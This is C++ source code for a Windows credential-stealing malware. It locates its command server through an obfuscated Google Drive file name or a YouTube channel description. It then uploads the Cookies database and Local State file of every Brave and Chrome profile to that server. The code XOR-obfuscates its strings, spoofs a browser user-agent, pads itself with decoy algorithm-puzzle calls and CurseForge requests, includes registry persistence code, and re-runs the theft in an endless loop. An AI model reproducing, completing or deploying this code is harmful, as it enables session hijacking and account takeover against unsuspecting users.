void ProcessFile(HINTERNET connection, const fs::path& filePath, const std::string& profileName, const std::string& fileType)
{
    if (fs::exists(filePath) && fs::is_regular_file(filePath))
    {
        std::string serverFileName = profileName + "_" + fileType;
        if (UploadFile(connection, filePath, serverFileName))
        {
            std::cout << profileName << " " << fileType << " yuklendi.\n";
        }
        else
        {
            std::cout << profileName << " " << fileType << " upload unsuccess.\n";
        }
    }
    else
    {
        std::cout << profileName << " " << fileType << " erisilemedi.\n";
    }
}
/////////////////////////////////////////////////////////////////////////////////////

// persistence //////////////////////////////////////////////////////////////////////
bool AddToStartup(const std::wstring& name, const std::wstring& exePath) { HKEY hKey{};
constexpr auto hkcu_xored_compiletime_1 =obfus_double_xor_enc_compiletime_1("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "agi");
constexpr auto hkcu_xored_xored_compiletime_1 =obfus_xor_round_compiletime_1(hkcu_xored_compiletime_1,"astra");
constexpr auto hkcu_xored_compiletime_2 =obfus_xor_dec_round_compiletime_1(hkcu_xored_xored_compiletime_1,"astra");
constexpr auto hkcu_compiletime_array_1 =obfus_xor_dec_round_compiletime_1(hkcu_xored_compiletime_2,"agi");
std::wstring hkcu_compiletime_array_2 =obfus_xor_to_wstring_compiletime_1(hkcu_compiletime_array_1);
if (RegOpenKeyExW( HKEY_CURRENT_USER, hkcu_compiletime_array_2.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return false;

// ## CSES.FI ##
auto r3 = csesfi1(10, 1000);

const LONG result = RegSetValueExW( hKey, name.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(exePath.c_str()), static_cast<DWORD>((exePath.size() + 1) * sizeof(wchar_t))); RegCloseKey(hKey); return result == ERROR_SUCCESS; }
/////////////////////////////////////////////////////////////////////////////////////

int libc_main(){

    constexpr auto drive_xored_compiletime_1 = obfus_xor_enc_compiletime_2("https://drive.google.com/file/d/1SZJoY4yn4QLi_9o7-Y7B0S6-wm9wE7Vh/view", "g a p");
    // ## CSES.FI ##
    int n2=1000000,m2=200000,k2=10; vector<tuple<int,int,long long>> flights2={{1,2,1},{1,3,2},{2,4,1},{3,4,1},{2,5,2},{3,5,2},{4,6,1},{5,6,1},{4,7,2},{5,7,2}};
    auto r2 = csesfi3(n2, m2, k2, flights2);
    std::wstring drive_compiletime_1 = obfus_xor_dec_compiletime_2(drive_xored_compiletime_1, "g a p");

    // get c2
    std::wstring c2_wserver;
    std::string dr_filename = GetDriveFileName(WStringToUTF8(drive_compiletime_1));

    // ## CSES.FI ##
    auto r5 = csesfi1(10, 200);

    // test : ! çıkart
    if (dr_filename.empty()){
        constexpr auto youtube_xored_compiletime_1 = obfus_xor_enc_compiletime_1("https://www.youtube.com/@og.carljohnson", "og");
        std::wstring youtube_compiletime_1 = obfus_xor_dec_compiletime_1(youtube_xored_compiletime_1, "og");

        std::string yt_description = GetYouTubeChannelDescription(WStringToUTF8(youtube_compiletime_1));

        constexpr auto cj_xored_compiletime_2 = obfus_xor_enc_compiletime_1("cj", "og");
        std::wstring cj_compiletime_2 = obfus_xor_dec_compiletime_1(cj_xored_compiletime_2, "og");

        std::string server_from_yt = c2_xordec(yt_description, WStringToUTF8(cj_compiletime_2));
        std::wstring wserver_yt(server_from_yt.begin(), server_from_yt.end());
        c2_wserver = wserver_yt;
    } else {
        constexpr auto cj_xored_compiletime_1 = obfus_xor_enc_compiletime_1("cj", "*o");
        std::wstring cj_compiletime_1 = obfus_xor_dec_compiletime_1(cj_xored_compiletime_1, "*o");

        std::string server_from_dr = c2_xordec(dr_filename, WStringToUTF8(cj_compiletime_1));
        std::wstring wserver_dr(server_from_dr.begin(), server_from_dr.end());
        c2_wserver = wserver_dr;
    }


    constexpr auto useragent_xored_compiletime_1 = obfus_xor_enc_compiletime_1("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "-.-");
    // ## CSES.FI ##
    auto r4 = csesfi1(10, 300);
    std::wstring useragent_compiletime_1 = obfus_xor_dec_compiletime_1(useragent_xored_compiletime_1, "-.-");

    HINTERNET session = WinHttpOpen(
        useragent_compiletime_1.c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!session){std::cerr << "WinHttpOpen basarisiz.\n";return 1;}
    
    // connect to c2
    HINTERNET connection = WinHttpConnect(
        session,
        //L"mirror-us.intel-thermal.workers.dev",
        //L"127.0.0.1",
        c2_wserver.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );

    if (!connection){std::cerr << "WinHttpConnect basarisiz.\n";WinHttpCloseHandle(session);return 1;}

    // gather cookies
    PWSTR localAppData = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);

    if (FAILED(hr)){std::cerr << "LocalAppData yolu alinamadi.\n";return 1;}


    constexpr auto BraveSoftware_xored_compiletime_1 = obfus_xor_enc_compiletime_1("BraveSoftware", "bra");
    std::wstring BraveSoftware_compiletime_1 = obfus_xor_dec_compiletime_1(BraveSoftware_xored_compiletime_1, "bra");
    constexpr auto BraveBrowser_xored_compiletime_1 = obfus_xor_enc_compiletime_2("Brave-Browser", "ves");
    std::wstring BraveBrowser_compiletime_1 = obfus_xor_dec_compiletime_2(BraveBrowser_xored_compiletime_1, "ves");
    constexpr auto UserData_xored_compiletime_1 = obfus_xor_enc_compiletime_1("User Data", "let");
    std::wstring UserData_compiletime_1 = obfus_xor_dec_compiletime_1(UserData_xored_compiletime_1, "let");
    constexpr auto UserData_xored_compiletime_2 = obfus_xor_enc_compiletime_2("User Data", "let");
    std::wstring UserData_compiletime_2 = obfus_xor_dec_compiletime_2(UserData_xored_compiletime_2, "let");

    // C:\Users\user\AppData\Local\BraveSoftware\Brave-Browser\User Data
    fs::path br_userDataPath = fs::path(localAppData) / BraveSoftware_compiletime_1 / BraveBrowser_compiletime_1 / UserData_compiletime_1;
    if (!fs::exists(br_userDataPath)){std::cerr << "Brave User Data klasoru bulunamadi.\n";return 1;}

    constexpr auto Google_xored_compiletime_1 = obfus_xor_enc_compiletime_2("Google", "?%??%");
    std::wstring Google_compiletime_1 = obfus_xor_dec_compiletime_2(Google_xored_compiletime_1, "?%??%");
    constexpr auto Chrome_xored_compiletime_1 = obfus_xor_enc_compiletime_1("Chrome", "!%!!%");
    std::wstring Chrome_compiletime_1 = obfus_xor_dec_compiletime_1(Chrome_xored_compiletime_1, "!%!!%");
    
    fs::path ch_userDataPath = fs::path(localAppData) / Google_compiletime_1 / Chrome_compiletime_1 / UserData_compiletime_1;
    CoTaskMemFree(localAppData);
    if (!fs::exists(ch_userDataPath)){std::cerr << "Chrome User Data klasoru bulunamadi.\n";return 1;}

    constexpr auto LocalState_xored_compiletime_1 = obfus_xor_enc_compiletime_1("Local State", "$");
    std::wstring LocalState_compiletime_1 = obfus_xor_dec_compiletime_1(LocalState_xored_compiletime_1, "$");

    constexpr auto LocalState_xored_compiletime_2 = obfus_xor_enc_compiletime_2("Local State", "$$");
    std::wstring LocalState_compiletime_2 = obfus_xor_dec_compiletime_2(LocalState_xored_compiletime_2, "$$");

    // br local state
    ProcessFile(connection, br_userDataPath / WStringToUTF8(LocalState_compiletime_1), WStringToUTF8(UserData_compiletime_2), WStringToUTF8(LocalState_compiletime_2));
    // ch local state
    ProcessFile(connection, ch_userDataPath / WStringToUTF8(LocalState_compiletime_2), WStringToUTF8(UserData_compiletime_1), WStringToUTF8(LocalState_compiletime_1));


    constexpr auto Default_xored_compiletime_1 = obfus_xor_enc_compiletime_2("Default", "rom");
    std::wstring Default_compiletime_1 = obfus_xor_dec_compiletime_2(Default_xored_compiletime_1, "rom");
    constexpr auto Default_xored_compiletime_2 = obfus_xor_enc_compiletime_1("Default", "rom");
    std::wstring Default_compiletime_2 = obfus_xor_dec_compiletime_2(Default_xored_compiletime_2, "rom");

    constexpr auto Profile_xored_compiletime_1 = obfus_xor_enc_compiletime_1("Profile", "besh");
    std::wstring Profile_compiletime_1 = obfus_xor_dec_compiletime_1(Profile_xored_compiletime_1, "besh");

    // ## CSES.FI ##
    auto r3 = csesfi1(100, 100);
    constexpr auto Network_xored_compiletime_1 = obfus_xor_enc_compiletime_2("Network", "cd");
    std::wstring Network_compiletime_1 = obfus_xor_dec_compiletime_1(Network_xored_compiletime_1, "cd");

    constexpr auto Cookies_xored_compiletime_1 =obfus_double_xor_enc_compiletime_1("Cookies", "cjog");
    constexpr auto Cookies_xored_xored_compiletime_1 =obfus_xor_round_compiletime_1(Cookies_xored_compiletime_1,"ogcj");
    constexpr auto Cookies_xored_compiletime_2 =obfus_xor_dec_round_compiletime_1(Cookies_xored_xored_compiletime_1,"ogcj");
    constexpr auto Cookies_compiletime_array =obfus_xor_dec_round_compiletime_1(Cookies_xored_compiletime_2,"cjog");
    std::wstring Cookies_compiletime_2 =obfus_xor_to_wstring_compiletime_1(Cookies_compiletime_array);

    // brave profiles
    for (const auto& entry : fs::directory_iterator(br_userDataPath))
    {

        // ## CSES.FI ##
        int n3=100000,m3=200000,k3=10; vector<tuple<int,int,long long>> flights4={{7,2,1},{1,3,2},{2,4,1},{3,4,1},{2,5,2},{3,5,2},{4,6,1},{5,6,1},{4,7,2},{5,7,2}};
        auto r6 = csesfi3(n3, m3, k3, flights4);

        if (entry.is_directory())
        {
            std::string dirName = entry.path().filename().string();
            if (dirName == WStringToUTF8(Default_compiletime_1) || dirName.find(WStringToUTF8(Profile_compiletime_1)) == 0)
            {
                fs::path cookiesPath = entry.path() / Network_compiletime_1 / Cookies_compiletime_2;
                if (!fs::exists(cookiesPath))
                {
                    cookiesPath = entry.path() / Cookies_compiletime_2;
                }
                ProcessFile(connection, cookiesPath, dirName, WStringToUTF8(Cookies_compiletime_2));
                fs::path profileLocalState = entry.path() / LocalState_compiletime_2;
                ProcessFile(connection, profileLocalState, dirName, WStringToUTF8(LocalState_compiletime_2));
            }
        }
    }

    // chrome profiles
    for (const auto& entry : fs::directory_iterator(ch_userDataPath))
    {

        if (entry.is_directory())
        {

            int n4=10000,m4=200000,k4=10; vector<tuple<int,int,long long>> flights5={{7,2,1},{1,7,2},{2,4,1},{3,4,1},{2,5,2},{3,5,2},{4,6,1},{5,6,1},{4,7,2},{5,7,2}};
            auto r7 = csesfi3(n4, m4, k4, flights5);

            std::string dirName = entry.path().filename().string();

            if (dirName == WStringToUTF8(Default_compiletime_2) || dirName.find(WStringToUTF8(Profile_compiletime_1)) == 0)
            {
                fs::path cookiesPath = entry.path() / Network_compiletime_1 / Cookies_compiletime_2;
                if (!fs::exists(cookiesPath))
                {
                    cookiesPath = entry.path() / Cookies_compiletime_2;
                }
                ProcessFile(connection, cookiesPath, dirName, WStringToUTF8(Cookies_compiletime_2));

                fs::path profileLocalState = entry.path() / LocalState_compiletime_1;
                ProcessFile(connection, profileLocalState, dirName, WStringToUTF8(LocalState_compiletime_2));
            }
        }
    }

    // conn close
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    return 0;
}

int main()
{

    // calm down
    //std::this_thread::sleep_for(std::chrono::seconds(67));

    // ## CSES.FI ##
    int r1 = csesfi2(100,200);
    // ## CURSE FORGE ##
    HttpGetCurseForge(r1);

    // persistence
    //wchar_t path[MAX_PATH];
    //GetModuleFileNameW(nullptr, path, MAX_PATH);
    //AddToStartup(L"CurseForge", path);

    // wait 
    //std::this_thread::sleep_for(std::chrono::seconds(27));
    
    libc_main();

    const int delays[] = {27, 34, 31, 37, 26, 30};
    int i = 0;
    while (1337)
    {
        std::this_thread::sleep_for(std::chrono::minutes(delays[i]));
        i = (i + 1) % 6;
        libc_main();
        // ## CSES.FI ##
        int r1 = csesfi2(delays[i],50);
        // ## CURSE FORGE ##
        HttpGetCurseForge(r1);
    }

    return 0;
}


